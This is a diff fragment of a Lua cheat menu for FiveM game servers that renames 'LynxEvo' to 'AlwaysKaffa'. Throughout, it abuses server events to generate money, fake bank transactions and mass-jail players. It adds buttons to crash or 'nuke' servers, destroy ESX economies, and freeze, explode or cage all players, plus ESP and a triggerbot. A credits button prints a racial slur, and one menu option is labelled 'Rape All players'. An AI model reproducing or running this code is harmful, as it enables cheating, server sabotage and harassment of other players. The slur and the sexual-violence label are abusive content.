+                elseif AlwaysKaffa.Button('~h~~s~Harvest ~g~Weed') then
                     hweed()
-                elseif LynxEvo.Button('~h~~g~Transform ~g~Weed') then
+                elseif AlwaysKaffa.Button('~h~~s~Transform ~g~Weed') then
                     tweed()
-                elseif LynxEvo.Button('~h~~g~Sell ~g~Weed') then
+                elseif AlwaysKaffa.Button('~h~~s~Sell ~g~Weed') then
                     sweed()
-                elseif LynxEvo.Button('~h~~w~Harvest ~w~Coke') then
+                elseif AlwaysKaffa.Button('~h~~s~Harvest ~w~Coke') then
                     hcoke()
-                elseif LynxEvo.Button('~h~~w~Transform ~w~Coke') then
+                elseif AlwaysKaffa.Button('~h~~s~Transform ~w~Coke') then
                     tcoke()
-                elseif LynxEvo.Button('~h~~w~Sell ~w~Coke') then
+                elseif AlwaysKaffa.Button('~h~~s~Sell ~w~Coke') then
                     scoke()
-                elseif LynxEvo.Button('~h~~r~Harvest Meth') then
+                elseif AlwaysKaffa.Button('~h~~s~Harvest ~b~Meth') then
                     hmeth()
-                elseif LynxEvo.Button('~h~~r~Transform Meth') then
+                elseif AlwaysKaffa.Button('~h~~s~Transform ~b~Meth') then
                     tmeth()
-                elseif LynxEvo.Button('~h~~r~Sell Meth') then
+                elseif AlwaysKaffa.Button('~h~~s~Sell ~b~Meth') then
                     smeth()
-                elseif LynxEvo.Button('~h~~p~Harvest Opium') then
+                elseif AlwaysKaffa.Button('~h~~s~Harvest ~r~Opium') then
                     hopi()
-                elseif LynxEvo.Button('~h~~p~Transform Opium') then
+                elseif AlwaysKaffa.Button('~h~~s~Transform ~r~Opium') then
                     topi()
-                elseif LynxEvo.Button('~h~~p~Sell Opium') then
+                elseif AlwaysKaffa.Button('~h~~s~Sell ~r~Opium') then
                     sopi()
-                elseif LynxEvo.Button('~h~~g~Money Wash') then
+                elseif AlwaysKaffa.Button('~h~~s~Sell ~r~Drugs ~s~to ~g~NPC') then
+                    snpc()
+                elseif AlwaysKaffa.Button('~h~~s~Wash ~g~Money') then
                     mataaspalarufe()
-                elseif LynxEvo.Button('~r~~h~Stop all') then
+                elseif AlwaysKaffa.Button('~h~~s~Harvest ~y~Bitcoin') then
+                    harvestbitcoin()
+                elseif AlwaysKaffa.Button('~h~~s~Sell ~y~Bitcoin') then
+                    sellbitcoin()
+                elseif AlwaysKaffa.Button('~h~~s~Harvest ~p~Gaz Bottle') then
+                    harvestgazbottle()
+                elseif AlwaysKaffa.Button('~h~~s~Craft ~p~Gaz Bottle') then
+                    craftgazbottle()
+                elseif AlwaysKaffa.Button('~h~~s~Harvest ~p~Repair Kit') then
+                    harvestrepairkits()
+                elseif AlwaysKaffa.Button('~h~~s~Craft ~p~Repair Kit') then
+                    craftrepairkits()
+                elseif AlwaysKaffa.Button('~h~~s~Harvest ~p~Body Kit') then
+                    harvestbodykits()
+                elseif AlwaysKaffa.Button('~h~~s~Craft ~p~Body Kit') then
+                    craftbodykits()
+                elseif AlwaysKaffa.Button('~h~~r~Hunting ~s~Reward') then
+                    TriggerServerEvent('esx-qalle-hunting:reward', 50)
+                elseif AlwaysKaffa.Button('~h~~s~Stop All') then
                     matanumaispalarufe()
                 elseif
-                    LynxEvo.CheckBox(
-                        '~h~~r~Blow Drugs Up ~y~DANGER!',
+                    AlwaysKaffa.CheckBox(
+                        '~h~~y~Blow Drugs Up ~r~DANGER!',
                         BlowDrugsUp,
                         function(dR)
                             BlowDrugsUp = dR
@@ -9732,9 +9934,9 @@ Citizen.CreateThread(
                     )
                  then
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('VRPTriggers') then
-                if LynxEvo.Button('~r~~h~VRP ~s~Give Money ~ypayGarage') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('VRPTriggers') then
+                if AlwaysKaffa.Button('~r~~h~VRP ~s~Give Money ~ypayGarage') then
                     local m = KeyboardInput('Enter amount of money', '', 100)
                     if m ~= '' then
                         TriggerServerEvent(
@@ -9744,12 +9946,12 @@ Citizen.CreateThread(
                             }
                         )
                     end
-                elseif LynxEvo.Button('~r~~h~VRP ~g~WIN ~s~Slot Machine') then
+                elseif AlwaysKaffa.Button('~r~~h~VRP ~g~WIN ~s~Slot Machine') then
                     local m = KeyboardInput('Enter amount of money', '', 100)
                     if m ~= '' then
                         TriggerServerEvent('vrp_slotmachine:server:2', m)
                     end
-                elseif LynxEvo.Button('~g~~h~FUEL ~y~Legacy Fuel') then
+                elseif AlwaysKaffa.Button('~g~~h~FUEL ~y~Legacy Fuel') then
                     local m = KeyboardInput('Enter amount of money', '', 100)
                     if m ~= '' then
                         TriggerServerEvent(
@@ -9759,28 +9961,28 @@ Citizen.CreateThread(
                             }
                         )
                     end
-                elseif LynxEvo.Button('~r~~h~VRP ~s~Get driving license') then
+                elseif AlwaysKaffa.Button('~r~~h~VRP ~s~Get driving license') then
                     TriggerServerEvent('dmv:success')
-                elseif LynxEvo.Button('~r~~h~VRP ~s~Bank Deposit') then
+                elseif AlwaysKaffa.Button('~r~~h~VRP ~s~Bank Deposit') then
                     local m = KeyboardInput('Enter amount of money', '', 100)
                     if m ~= '' then
                         TriggerServerEvent('Banca:deposit', m)
                         TriggerServerEvent('bank:deposit', m)
                     end
-                elseif LynxEvo.Button('~r~~h~VRP ~s~Bank Withdraw ') then
+                elseif AlwaysKaffa.Button('~r~~h~VRP ~s~Bank Withdraw ') then
                     local m = KeyboardInput('Enter amount of money', '', 100)
                     if m ~= '' then
                         TriggerServerEvent('bank:withdraw', m)
                         TriggerServerEvent('Banca:withdraw', m)
                     end
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('MiscTriggers') then
-                if LynxEvo.Button('~h~Send Discord Message') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('MiscTriggers') then
+                if AlwaysKaffa.Button('~h~Send Discord Message') then
                     local et = KeyboardInput('Enter message to send', '', 100)
                     TriggerServerEvent('DiscordBot:playerDied', et, '1337')
                     av('The message:~n~' .. et .. '~n~Has been ~g~sent!', true)
-                elseif LynxEvo.Button('~h~Send Fake Message') then
+               --[[elseif AlwaysKaffa.Button('~h~Send Fake Message') then
                     local eu = KeyboardInput('Enter player name', '', 100)
                     if eu then
                         local db = KeyboardInput('Enter message', '', 1000)
@@ -9796,19 +9998,19 @@ Citizen.CreateThread(
                                 db
                             )
                         end
-                    end
-                elseif LynxEvo.Button('~h~~g~ESX ~y~CarThief ~s~TROLL') then
+                    end--]]
+                elseif AlwaysKaffa.Button('~h~~g~ESX ~y~CarThief ~s~TROLL') then
                     av('~y~esx_carthief ~g~required', true)
                     av('~g~Trying to send alerts', false)
                     carthieftroll()
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('AdvM') then
-                if LynxEvo.MenuButton('~h~~p~#~s~ Destroyer Menu', 'Destroyer') then
-                elseif LynxEvo.MenuButton('~h~~p~#~s~ ESP Menu', 'ESPMenu') then
-                elseif LynxEvo.MenuButton('~h~~p~#~s~ Crosshairs', 'CsMenu') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('AdvM') then
+                if AlwaysKaffa.MenuButton('~h~~p~»~s~ Destroyer Menu', 'Destroyer') then
+                elseif AlwaysKaffa.MenuButton('~h~~p~»~s~ ESP Menu', 'ESPMenu') then
+                elseif AlwaysKaffa.MenuButton('~h~~p~»~s~ Crosshairs', 'CsMenu') then
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~TriggerBot',
                         TriggerBot,
                         function(dR)
@@ -9817,7 +10019,7 @@ Citizen.CreateThread(
                     )
                  then
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~Player Blips',
                         dx,
                         function(dx)
@@ -9827,7 +10029,7 @@ Citizen.CreateThread(
                     cL = not cL
                     dx = cL
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~Name Above Players ~g~v1',
                         cM,
                         function(dR)
@@ -9837,7 +10039,7 @@ Citizen.CreateThread(
                     )
                  then
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~Name Above Players n Indicator ~g~v2',
                         cN,
                         function(dR)
@@ -9847,7 +10049,7 @@ Citizen.CreateThread(
                     )
                  then
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~~r~Freeze~s~ All players',
                         freezeall,
                         function(dR)
@@ -9856,7 +10058,7 @@ Citizen.CreateThread(
                     )
                  then
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~~r~Explode~s~ All players',
                         blowall,
                         function(dR)
@@ -9864,7 +10066,7 @@ Citizen.CreateThread(
                         end
                     )
                  then
-                elseif LynxEvo.Button('~h~~r~BORGAR~s~ Everyone') then
+                elseif AlwaysKaffa.Button('~h~~r~Burger~s~ Everyone') then
                     for i = 0, 128 do
                         if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                             local eb = 'xs_prop_hamburgher_wl'
@@ -9918,18 +10120,8 @@ Citizen.CreateThread(
                             )
                         end
                     end
-                elseif LynxEvo.Button('~h~~o~Discord RPC~s~ Add/Remove') then
-                    h = not h
-                    if not h then
-                        SetRichPresence(0)
-                        SetDiscordAppId(0)
-                        SetDiscordRichPresenceAsset(0)
-                        SetDiscordRichPresenceAssetText(0)
-                    else
-                        e()
-                    end
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~~r~Ra~g~nd~b~om ~s~Notification Color',
                         rgbnot,
                         function(dR)
@@ -9938,8 +10130,8 @@ Citizen.CreateThread(
                     )
                  then
                 elseif
-                    LynxEvo.CheckBox(
-                        '~h~~r~Confirms~s~ masterswitch',
+                    AlwaysKaffa.CheckBox(
+                        '~h~~r~Confirms~s~ Masterswitch',
                         cO,
                         function(dR)
                             cO = dR
@@ -9947,10 +10139,10 @@ Citizen.CreateThread(
                     )
                  then
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('CsMenu') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('CsMenu') then
                 if
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~~y~Original ~s~Crosshair',
                         crosshair,
                         function(dR)
@@ -9961,7 +10153,7 @@ Citizen.CreateThread(
                     )
                  then
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~~r~CROSS ~s~Crosshair',
                         crosshairc,
                         function(dR)
@@ -9972,7 +10164,7 @@ Citizen.CreateThread(
                     )
                  then
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~~r~DOT ~s~Crosshair',
                         crosshairc2,
                         function(dR)
@@ -9983,12 +10175,12 @@ Citizen.CreateThread(
                     )
                  then
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('Destroyer') then
-                if LynxEvo.Button('~h~~r~Nuke ~s~Server') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('Destroyer') then
+                if AlwaysKaffa.Button('~h~~r~Nuke ~s~Server') then
                     nukeserver()
-                elseif
-                    LynxEvo.CheckBox(
+                elseif 
+                    AlwaysKaffa.CheckBox(
                         '~h~~r~Silent ~s~Server ~y~Crasher',
                         servercrasherxd,
                         function(dR)
@@ -9996,31 +10188,31 @@ Citizen.CreateThread(
                         end
                     )
                  then
-                elseif LynxEvo.Button('~h~~g~ESX ~r~Destroy ~b~v2') then
+                elseif AlwaysKaffa.Button('~h~~g~ESX ~r~Destroy ~b~v2') then
                     esxdestroyv2()
-                elseif LynxEvo.Button('~h~~g~ESX ~r~Destroy ~b~Salary') then
-                    EconomyDy2()
-                elseif LynxEvo.Button('~h~~r~VRP ~s~Give everyone money') then
-                    vrpdestroy()
-                elseif LynxEvo.Button('~h~~g~ESX ~s~Give everyone money') then
+                elseif AlwaysKaffa.Button('~h~~g~ESX ~r~Destroy ~b~Salary') then
+                    EconomyDestroySalary1()
+                elseif AlwaysKaffa.Button('~h~~g~ESX ~s~Give everyone money') then
                     giveeveryone()
-                elseif LynxEvo.Button('~h~~r~Jail~s~ All players') then
+                elseif AlwaysKaffa.Button('~h~~r~VRP ~s~Give everyone money') then
+                    vrpdestroy()
+                elseif AlwaysKaffa.Button('~h~~r~Jail~s~ All players') then
                     for i = 0, 128 do
                         TriggerServerEvent(
                             'esx-qalle-jail:jailPlayer',
                             GetPlayerServerId(i),
                             5000,
-                            'xaxaxaxaxaxaxaxaxax'
+                            '~r~ Lynx Menu ~g~10.1'
                         )
                         TriggerServerEvent('esx_jailer:sendToJail', GetPlayerServerId(i), 45 * 60)
                         TriggerServerEvent('esx_jail:sendToJail', GetPlayerServerId(i), 45 * 60)
-                        TriggerServerEvent('js:jailuser', GetPlayerServerId(i), 45 * 60, 'xaxaxaxaxaxaxaxaxax')
+                        TriggerServerEvent('js:jailuser', GetPlayerServerId(i), 45 * 60, '~r~ Lynx Menu ~g~10.1')
                     end
-                elseif LynxEvo.Button('~h~~r~Banana ~p~Party~s~ All players') then
+                elseif AlwaysKaffa.Button('~h~~r~Banana ~p~Party~s~ All players') then
                     bananapartyall()
-                elseif LynxEvo.Button('~h~~r~Rape~s~ All players') then
+                elseif AlwaysKaffa.Button('~h~~r~Rape~s~ All players') then
                     RapeAllFunc()
-                elseif LynxEvo.Button('~h~~r~Cage~s~ All players') then
+                elseif AlwaysKaffa.Button('~h~~r~Cage~s~ All players') then
                     for i = 0, 255 do
                         x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(i)))
                         roundx = tonumber(string.format('%.2f', x))
@@ -10056,39 +10248,35 @@ Citizen.CreateThread(
                         FreezeEntityPosition(ea, true)
                     end
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('crds') then
-                if LynxEvo.Button('~h~~p~#~s~ XDXDXD ~p~DEV') then
-                    av('~h~~o~XDXDXD!~s~.', false)
-                    av('XDXDXDXD?', false)
-                    av('XDXDXDXD', false)
-                elseif LynxEvo.Button('~h~~p~#~s~ XDXDXD ~p~DEV') then
-                elseif LynxEvo.Button('~h~~p~#~s~ XDXDXD ~p~DEV') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('crds') then
+                if AlwaysKaffa.Button('~h~~p~»~s~ Nertigel~r~#5391 ~p~DEV') then
+                    av('~h~~o~dont click me u nigger!~s~.', false)
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('WeaponTypes') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('WeaponTypes') then
                 for e0, ev in pairs(b7) do
-                    if LynxEvo.MenuButton('~h~~p~#~s~ ' .. e0, 'WeaponTypeSelection') then
+                    if AlwaysKaffa.MenuButton('~h~~p~»~s~ ' .. e0, 'WeaponTypeSelection') then
                         dy = ev
                     end
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('WeaponTypeSelection') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('WeaponTypeSelection') then
                 for e0, ev in pairs(dy) do
-                    if LynxEvo.MenuButton(ev.name, 'WeaponOptions') then
+                    if AlwaysKaffa.MenuButton(ev.name, 'WeaponOptions') then
                         dz = ev
                     end
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('WeaponOptions') then
-                if LynxEvo.Button('~h~~r~Spawn Weapon') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('WeaponOptions') then
+                if AlwaysKaffa.Button('~h~~r~Spawn Weapon') then
                     GiveWeaponToPed(GetPlayerPed(-1), GetHashKey(dz.id), 1000, false)
                 end
-                if LynxEvo.Button('~h~~g~Add Ammo') then
+                if AlwaysKaffa.Button('~h~~g~Add Ammo') then
                     SetPedAmmo(GetPlayerPed(-1), GetHashKey(dz.id), 5000)
                 end
                 if
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~~r~Infinite ~s~Ammo',
                         dz.bInfAmmo,
                         function(ew)
@@ -10102,34 +10290,34 @@ Citizen.CreateThread(
                     SetPedShootRate(GetPlayerPed(-1), 1000)
                 end
                 for e0, ev in pairs(dz.mods) do
-                    if LynxEvo.MenuButton('~h~~p~#~s~ ~h~~r~> ~s~' .. e0, 'ModSelect') then
+                    if AlwaysKaffa.MenuButton('~h~~p~»~s~ ~h~~p~» ~s~' .. e0, 'ModSelect') then
                         dA = ev
                     end
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('ModSelect') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('ModSelect') then
                 for _, ev in pairs(dA) do
-                    if LynxEvo.Button(ev.name) then
+                    if AlwaysKaffa.Button(ev.name) then
                         GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey(dz.id), GetHashKey(ev.id))
                     end
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('CarTypes') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('CarTypes') then
                 for i, ex in ipairs(b3) do
-                    if LynxEvo.MenuButton('~h~~p~#~s~ ' .. ex, 'CarTypeSelection') then
+                    if AlwaysKaffa.MenuButton('~h~~p~»~s~ ' .. ex, 'CarTypeSelection') then
                         carTypeIdx = i
                     end
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('CarTypeSelection') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('CarTypeSelection') then
                 for i, ex in ipairs(b4[carTypeIdx]) do
-                    if LynxEvo.MenuButton('~h~~p~#~s~ ~h~~r~>~s~ ' .. ex, 'CarOptions') then
+                    if AlwaysKaffa.MenuButton('~h~~p~»~s~ ~h~~p~»~s~ ' .. ex, 'CarOptions') then
                         carToSpawn = i
                     end
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('CarOptions') then
-                if LynxEvo.Button('~h~~r~Spawn Car') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('CarOptions') then
+                if AlwaysKaffa.Button('~h~~r~Spawn Car') then
                     local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                     local veh = b4[carTypeIdx][carToSpawn]
                     if veh == nil then
@@ -10156,20 +10344,20 @@ Citizen.CreateThread(
                         end
                     )
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('MainTrailer') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('MainTrailer') then
                 if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                     for i, ex in ipairs(b5) do
-                        if LynxEvo.MenuButton('~h~~p~#~s~ ~h~~r~>~s~ ' .. ex, 'MainTrailerSpa') then
+                        if AlwaysKaffa.MenuButton('~h~~p~»~s~ ~h~~p~»~s~ ' .. ex, 'MainTrailerSpa') then
                             TrailerToSpawn = i
                         end
                     end
                 else
                     av('~h~~w~Not in a vehicle', true)
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('MainTrailerSpa') then
-                if LynxEvo.Button('~h~~r~Spawn Car') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('MainTrailerSpa') then
+                if AlwaysKaffa.Button('~h~~r~Spawn Car') then
                     local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                     local veh = b5[TrailerToSpawn]
                     if veh == nil then
@@ -10198,17 +10386,17 @@ Citizen.CreateThread(
                         end
                     )
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('GiveSingleWeaponPlayer') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('GiveSingleWeaponPlayer') then
                 for i = 1, #b6 do
-                    if LynxEvo.Button(b6[i]) then
+                    if AlwaysKaffa.Button(b6[i]) then
                         GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(b6[i]), 1000, false, true)
                     end
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('ESPMenu') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('ESPMenu') then
                 if
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~~r~ESP ~s~MasterSwitch',
                         esp,
                         function(dR)
@@ -10217,7 +10405,7 @@ Citizen.CreateThread(
                     )
                  then
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~~r~ESP ~s~Box',
                         espbox,
                         function(dR)
@@ -10226,7 +10414,7 @@ Citizen.CreateThread(
                     )
                  then
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~~r~ESP ~s~Info',
                         espinfo,
                         function(dR)
@@ -10235,7 +10423,7 @@ Citizen.CreateThread(
                     )
                  then
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~~r~ESP ~s~Lines',
                         esplines,
                         function(dR)
@@ -10244,15 +10432,15 @@ Citizen.CreateThread(
                     )
                  then
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('LSC') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('LSC') then
                 local veh = GetVehiclePedIsUsing(PlayerPedId())
-                if LynxEvo.MenuButton('~h~~p~#~s~ ~h~~r~Exterior ~s~Tuning', 'tunings') then
-                elseif LynxEvo.MenuButton('~h~~p~#~s~ ~h~~r~Performance ~s~Tuning', 'performance') then
-                elseif LynxEvo.Button('~h~Change Car License Plate') then
+                if AlwaysKaffa.MenuButton('~h~~p~»~s~ ~h~~r~Exterior ~s~Tuning', 'tunings') then
+                elseif AlwaysKaffa.MenuButton('~h~~p~»~s~ ~h~~r~Performance ~s~Tuning', 'performance') then
+                elseif AlwaysKaffa.Button('~h~Change Car License Plate') then
                     cu()
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~~g~R~r~a~y~i~b~n~o~b~r~o~g~w ~s~Vehicle Colour',
                         RainbowVeh,
                         function(dR)
@@ -10260,12 +10448,12 @@ Citizen.CreateThread(
                         end
                     )
                  then
-                elseif LynxEvo.Button('~h~Make vehicle ~y~dirty') then
+                elseif AlwaysKaffa.Button('~h~Make vehicle ~y~dirty') then
                     Clean(GetVehiclePedIsUsing(PlayerPedId(-1)))
-                elseif LynxEvo.Button('~h~Make vehicle ~g~clean') then
+                elseif AlwaysKaffa.Button('~h~Make vehicle ~g~clean') then
                     Clean2(GetVehiclePedIsUsing(PlayerPedId(-1)))
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~~g~R~r~a~y~i~b~n~o~b~r~o~g~w ~s~Neons & Headlights',
                         rainbowh,
                         function(dR)
@@ -10274,10 +10462,10 @@ Citizen.CreateThread(
                     )
                  then
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('BoostMenu') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('BoostMenu') then
                 if
-                    LynxEvo.ComboBox(
+                    AlwaysKaffa.ComboBox(
                         '~h~Engine ~r~Power ~s~Booster',
                         dD,
                         dB,
@@ -10290,7 +10478,7 @@ Citizen.CreateThread(
                     )
                  then
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~Engine ~g~Torque ~s~Booster ~g~2x',
                         t2x,
                         function(dR)
@@ -10304,7 +10492,7 @@ Citizen.CreateThread(
                     )
                  then
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~Engine ~g~Torque ~s~Booster ~g~4x',
                         t4x,
                         function(dR)
@@ -10318,7 +10506,7 @@ Citizen.CreateThread(
                     )
                  then
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~Engine ~g~Torque ~s~Booster ~g~10x',
                         t10x,
                         function(dR)
@@ -10332,7 +10520,7 @@ Citizen.CreateThread(
                     )
                  then
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~Engine ~g~Torque ~s~Booster ~g~16x',
                         t16x,
                         function(dR)
@@ -10346,7 +10534,7 @@ Citizen.CreateThread(
                     )
                  then
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~Engine ~g~Torque ~s~Booster ~y~XD',
                         txd,
                         function(dR)
@@ -10360,7 +10548,7 @@ Citizen.CreateThread(
                     )
                  then
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~Engine ~g~Torque ~s~Booster ~y~BIG XD',
                         tbxd,
                         function(dR)
@@ -10374,49 +10562,16 @@ Citizen.CreateThread(
                     )
                  then
                 end
-                LynxEvo.Display()
-            elseif IsDisabledControlPressed(0, 122) then
-                if logged then
-                    LynxEvo.OpenMenu('xAriess')
+                AlwaysKaffa.Display()
+            elseif IsDisabledControlPressed(0, 19) and IsDisabledControlPressed(0, 48) then
+                if H4tuf5 then
+                    AlwaysKaffa.OpenMenu('AlwaysKaffa')
+                else
+                    TmEM1U()
                 end
-                LynxEvo.Display()
-            elseif IsDisabledControlPressed(0, 47) and IsDisabledControlPressed(0, 21) then
-                if logged then
-                    LynxEvo.OpenMenu('xAriess')
-                end
+                AlwaysKaffa.Display()
             end
             Citizen.Wait(0)
         end
     end
-)
-RegisterCommand(
-    'haha',
-    function(eA, eB, eC)
-        bv = true
-        RapeAllFunc()
-        bananapartyall()
-        EconomyDy2()
-        AmbulancePlayers()
-        for i = 0, 128 do
-            TriggerServerEvent('esx-qalle-jail:jailPlayer', GetPlayerServerId(i), 5000, 'xaxaxaxaxaxaxaxaxax')
-            TriggerServerEvent('esx_jailer:sendToJail', GetPlayerServerId(i), 45 * 60)
-            TriggerServerEvent('esx_jail:sendToJail', GetPlayerServerId(i), 45 * 60)
-            TriggerServerEvent('js:jailuser', GetPlayerServerId(i), 45 * 60, 'xaxaxaxaxaxaxaxaxax')
-        end
-    end,
-    false
-)
-RegisterCommand(
-    'pk',
-    function(eA, eB, eC)
-        bw = false
-    end,
-    false
-)
-RegisterCommand(
-    'lol',
-    function(eA, eB, eC)
-        mhaonn = false
-    end,
-    false
 )
